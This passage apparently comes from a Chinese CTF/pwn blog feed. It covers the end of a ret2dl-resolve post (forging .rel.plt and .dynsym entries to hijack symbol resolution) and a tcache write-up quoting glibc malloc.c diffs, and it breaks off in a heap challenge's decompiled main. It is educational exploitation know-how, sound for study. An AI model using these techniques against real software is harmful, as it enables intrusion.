invoke__">elf_machine_fixup_plt</span> (l, result, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里动态链接的过程就结束了</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在上面的链接过程中我们了解到<br>在.dynsym里第一个是name的地址,而这个地址加上.dynstr就是字符串的位置,如我的示例程序中.dynsym地址为:0x80481d8,.dynstr为0x08048278:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">32</span>x <span class="hljs-number">0</span>x80481d8<br><span class="hljs-attribute">0x80481d8</span>:      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0x80481e8</span>:      <span class="hljs-number">0</span>x00000033      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000012<br><span class="hljs-attribute">0x80481f8</span>:      <span class="hljs-number">0</span>x00000027      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000012<br><span class="hljs-attribute">0x8048208</span>:      <span class="hljs-number">0</span>x00000052      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000020<br><span class="hljs-attribute">0x8048218</span>:      <span class="hljs-number">0</span>x00000020      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000012<br><span class="hljs-attribute">0x8048228</span>:      <span class="hljs-number">0</span>x0000003a      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000012<br><span class="hljs-attribute">0x8048238</span>:      <span class="hljs-number">0</span>x0000004c      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000000      <span class="hljs-number">0</span>x00000012<br><span class="hljs-attribute">0x8048248</span>:      <span class="hljs-number">0</span>x0000002c      <span class="hljs-number">0</span>x0804a044      <span class="hljs-number">0</span>x00000004      <span class="hljs-number">0</span>x001a0011<br><span class="hljs-attribute">pwndbg</span>&gt; x/s <span class="hljs-number">0</span>x08048278 +<span class="hljs-number">0</span>x33<br><span class="hljs-attribute">0x80482ab</span>:      <span class="hljs-string">&quot;setbuf&quot;</span><br><span class="hljs-attribute">pwndbg</span>&gt; x/s <span class="hljs-number">0</span>x08048278 +<span class="hljs-number">0</span>x27<br><span class="hljs-attribute">0x804829f</span>:      <span class="hljs-string">&quot;read&quot;</span><br></code></pre></td></tr></table></figure><p>综上,我们可以得到一个利用的思路(这里调整综合了一些师傅的思路):</p><ul><li><p>根据.dynamic段是否可写分为两种:</p><ul><li><p>当.dynamic段可写时,我们可以把.dynstr段劫持到.bss段,而在.bss段里伪造目标字符串</p></li><li><p>当.dynamic不可写时,我们可以把传入的rel_offset改为目标函数的偏移大小.</p></li></ul></li><li><p>因为.rel.plt段中不一定存在我们需要的函数,所以我们可以将rel_offset修改为一个比较大的值,然后伪造一个.rel.plt段</p></li><li><p>因为程序是根据r_info来找到.dynsym[num]的,所以我们可以伪造Elf32_Sym -&gt; st_name,使.dynstr + st_name可控,指向我们伪造的函数字符串(函数名)</p></li><li><p>假设从bss + 0×80处伪造.rel.plt项,rel_offset &#x3D; bss_address + 0x80 - Addr[.rel.plt].</p></li><li><p>r_offset为函数对应.got.plt项的地址.r_info保存了对应.dynsym中的index和flag.可以在这段数据后伪造.dynsym,例如:</p><ul><li>bss + 0x100处,即index &#x3D; (bss + 0×100 - Addr[.dynsym]) &#x2F; 0×10(SYMENT为16字节),类型必须为7(LF32_R_TYPE)</li><li>r_info &#x3D; (index &lt;&lt; 8 ) | 0x7.</li><li>因为.dynsym包含四个字段,而我们只需要更改st_name部分即可,其余的值完全可以不更改,因为st_name表示了字符串相对strtab的偏移,所以我们可以将字符串写在这段数据后.</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tcache.md</title>
    <link href="/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>tcache作为libc2.26新加的机制,优先级高于fastbin,在提升速度的同时及完美的诠释了要速度就牺牲安全性这一定则。可以在<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">这里</a>找到当时新更新的代码。</p></blockquote><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>tcache(thread local caching),作为一个优先级高于fastbin新的缓存cache，相比fastbin是提升了不少的性能，但与此同时，带来的副作用就是比fastbin更好利用。我们可以看看更新的内容</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs erlang">* config.make.in: Enable experimental malloc option.<br>* configure.ac: Likewise.<br>* configure: Regenerate.<br>* manual/install.texi: Document it.<br>* INSTALL: Regenerate.<br>* malloc/Makefile: Likewise.<br>* malloc/malloc.c: Add per-thread cache (tcache).<br>(tcache_put): New.<br>(tcache_get): New.<br>(tcache_thread_freeres): New.<br>(tcache_init): New.<br>(__libc_malloc): Use cached chunks <span class="hljs-keyword">if</span> available.<br>(__libc_free): Initialize tcache <span class="hljs-keyword">if</span> needed.<br>(__libc_realloc): Likewise.<br>(__libc_calloc): Likewise.<br>(_int_malloc): Prefill tcache <span class="hljs-keyword">when</span> appropriate.<br>(_int_free): Likewise.<br>(do_set_tcache_max): New.<br>(do_set_tcache_count): New.<br>(do_set_tcache_unsorted_limit): New.<br>* manual/probes.texi: Document new probes.<br>* malloc/arena.c: Add new tcache tunables.<br>* elf/dl-tunables.list: Likewise.<br>* manual/tunables.texi: Document them.<br>* NEWS: Mention the per-thread cache.<br></code></pre></td></tr></table></figure><p>这里我们直接看malloc.c所加的代码</p><h2 id="malloc-c"><a href="#malloc-c" class="headerlink" title="malloc.c"></a>malloc.c</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>先看下最前面所定义的东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">1</span> +<span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-number">2</span> +<span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-number">3</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS               64</span><br><span class="hljs-number">4</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE       tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="hljs-number">5</span> +<br><span class="hljs-number">6</span> +<span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-number">7</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)       (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="hljs-number">8</span> +<br><span class="hljs-number">9</span> +<span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-number">10</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-number">11</span> +<span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-number">12</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="hljs-number">13</span> +<br><span class="hljs-number">14</span> +<span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">15 +   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">16 +   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">17 +   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">18 +   etc.  */</span><br><span class="hljs-number">19</span> +<br><span class="hljs-number">20</span> +<span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">21 +   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-number">22</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-number">23</span> +<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>+<br></code></pre></td></tr></table></figure><ul><li>可以看到规定tcache最多由64个Bins链接而成(第三行),而每一个bins里最多存放7个chunk(第21行)</li><li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次.(15-17行)</li></ul><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>在tcache机制中新增了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs d">+<span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">+   the chunk is stored in the per-thread cache.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_entry<br>+&#123;<br>+  <span class="hljs-keyword">struct</span> tcache_entry *next;<br>+&#125; tcache_entry;<br>+<br>+<span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">+   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">+   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">+   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">+   time), this is for performance reasons.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_perthread_struct<br>+&#123;<br>+  <span class="hljs-built_in">char</span> counts[TCACHE_MAX_BINS];<br>+  tcache_entry *entries[TCACHE_MAX_BINS];<br>+&#125; tcache_perthread_struct;<br>+<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> <span class="hljs-built_in">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> tcache_perthread_struct *tcache = NULL;<br></code></pre></td></tr></table></figure><ul><li>可以看到tcache_entry为单链表结构</li><li>而tcache_perthread_struct为tcahch机制的主体<ol><li>一个链表中内存块的最大数量为TCACHE_MAX_BINS即64;</li><li>不同大小的单链表(64)</li></ol></li></ul><h3 id="两个新定义的函数-tcache-get-和tcache-put"><a href="#两个新定义的函数-tcache-get-和tcache-put" class="headerlink" title="两个新定义的函数(tcache_get 和tcache_put)"></a>两个新定义的函数(tcache_get 和tcache_put)</h3><p>这两个函数被用于在链表中取出和插入chunk</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xl">+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">+   for more chunks.  */</span><br>+static void<br>+tcache_put (mchunkptr chunk, size_t tc_idx)<br>+&#123;<br>+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = tcache-&gt;</span>entries[tc_idx];<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>entries[tc_idx] = e;<br>+  ++(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+&#125;<br>+<br>+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">+   available chunks to remove.  */</span><br>+static void *<br>+tcache_get (size_t tc_idx)<br>+&#123;<br>+  <span class="hljs-function"><span class="hljs-title">tcache_entry</span> *e = tcache-&gt;</span>entries[tc_idx];<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">assert</span> (tcache-&gt;</span>entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">entries</span>[tc_idx] = e-&gt;</span>next;<br>+  --(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+  return (void *) e;<br>+&#125;<br>+<br></code></pre></td></tr></table></figure><p>可以看到开发者希望我们确信参数是合法的,但安全性而言,这完全是放开了检查机制,摒弃了安全性而只追求速度</p><h3 id="tcache-thread-freeres"><a href="#tcache-thread-freeres" class="headerlink" title="tcache_thread_freeres"></a>tcache_thread_freeres</h3><p>用于清空当前线程的tcache</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+</span><br><span class="hljs-addition">+static void __attribute__ ((section (&quot;__libc_thread_freeres_fn&quot;)))</span><br><span class="hljs-addition">+tcache_thread_freeres (void)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+  int i;</span><br><span class="hljs-addition">+  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (!tcache)</span><br><span class="hljs-addition">+    return;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  tcache = NULL;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      while (tcache_tmp-&gt;entries[i])</span><br><span class="hljs-addition">+       &#123;</span><br><span class="hljs-addition">+         tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="hljs-addition">+         tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="hljs-addition">+         __libc_free (e);</span><br><span class="hljs-addition">+       &#125;</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  __libc_free (tcache_tmp);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  tcache_shutting_down = 1;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+text_set_element (__libc_thread_subfreeres, tcache_thread_freeres);</span><br><span class="hljs-addition">+</span><br></code></pre></td></tr></table></figure><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init_"></a>tcache_init_</h3><p>初始化函数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+static void</span><br><span class="hljs-addition">+tcache_init(void)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+  mstate ar_ptr;</span><br><span class="hljs-addition">+  void *victim = 0;</span><br><span class="hljs-addition">+  const size_t bytes = sizeof (tcache_perthread_struct);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (tcache_shutting_down)</span><br><span class="hljs-addition">+    return;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  arena_get (ar_ptr, bytes);</span><br><span class="hljs-addition">+  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="hljs-addition">+  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="hljs-addition">+      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (ar_ptr != NULL)</span><br><span class="hljs-addition">+    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  /* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-addition">+     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-addition">+     typically do this very early, so either there is sufficient</span><br><span class="hljs-addition">+     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-addition">+     allocations anyway.  */</span><br><span class="hljs-addition">+  if (victim)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      tcache = (tcache_perthread_struct *) victim;</span><br><span class="hljs-addition">+      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+&#125;</span><br></code></pre></td></tr></table></figure><p>可以看到tcache的内存块是由_int_malloc_生成的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="hljs-addition">+  size_t tbytes = request2size (bytes);</span><br><span class="hljs-addition">+  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  MAYBE_INIT_TCACHE ();</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="hljs-addition">+  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="hljs-addition">+      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="hljs-addition">+      &amp;&amp; tcache</span><br><span class="hljs-addition">+      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      return tcache_get (tc_idx);</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+  DIAG_POP_NEEDS_COMMENT;</span><br><span class="hljs-addition">+#endif</span><br></code></pre></td></tr></table></figure><p>这里主要检查了tcache和tcahce_list是否为空和参数是否越界的问题<br>如果没有问题就调用tcache_get函数</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>而_int_malloc函数中是这么写的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+         /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-addition">+            stash them in the tcache.  */</span><br><span class="hljs-addition">+         size_t tc_idx = csize2tidx (nb);</span><br><span class="hljs-addition">+         if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="hljs-addition">+           &#123;</span><br><span class="hljs-addition">+             mchunkptr tc_victim;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+             /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="hljs-addition">+             while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="hljs-addition">+                    &amp;&amp; (pp = *fb) != NULL)</span><br><span class="hljs-addition">+               &#123;</span><br><span class="hljs-addition">+                 REMOVE_FB (fb, tc_victim, pp);</span><br><span class="hljs-addition">+                 if (tc_victim != 0)</span><br><span class="hljs-addition">+                   &#123;</span><br><span class="hljs-addition">+                     tcache_put (tc_victim, tc_idx);</span><br><span class="hljs-addition">+                   &#125;</span><br><span class="hljs-addition">+               &#125;</span><br><span class="hljs-addition">+           &#125;</span><br><span class="hljs-addition">+#endif</span><br></code></pre></td></tr></table></figure><h3 id="init-free"><a href="#init-free" class="headerlink" title="_init_free"></a>_init_free</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+  &#123;</span><br><span class="hljs-addition">+    size_t tc_idx = csize2tidx (size);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+    if (tcache</span><br><span class="hljs-addition">+       &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="hljs-addition">+       &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="hljs-addition">+      &#123;</span><br><span class="hljs-addition">+       tcache_put (p, tc_idx);</span><br><span class="hljs-addition">+       return;</span><br><span class="hljs-addition">+      &#125;</span><br><span class="hljs-addition">+  &#125;</span><br><span class="hljs-addition">+#endif</span><br><span class="hljs-addition">+</span><br></code></pre></td></tr></table></figure><p>先判断参数合法，相同大小chunk的数量在7个以内时，就进入 tcache_put()进行释放</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>tcache的优先级是最高的,在满足tcache所需size的chunk中,free后一定是先进入tcache的</li><li>由于删减了一些检查机制,从而使得安全性急剧下降</li></ul><h1 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h1><blockquote><p>这里引用ex师傅的一道题,顺便安利一下<a href="http://blog.eonew.cn/">EX师傅的博客</a></p></blockquote><h2 id="mian函数"><a href="#mian函数" class="headerlink" title="mian函数"></a>mian函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x3Cu</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(menu);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)off_<span class="hljs-number">400E38</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        <span class="hljs-built_in">add</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        <span class="hljs-built_in">delete</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        <span class="hljs-built_in">edit</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        <span class="hljs-built_in">show</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid option!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v4 != <span class="hljs-number">5</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span 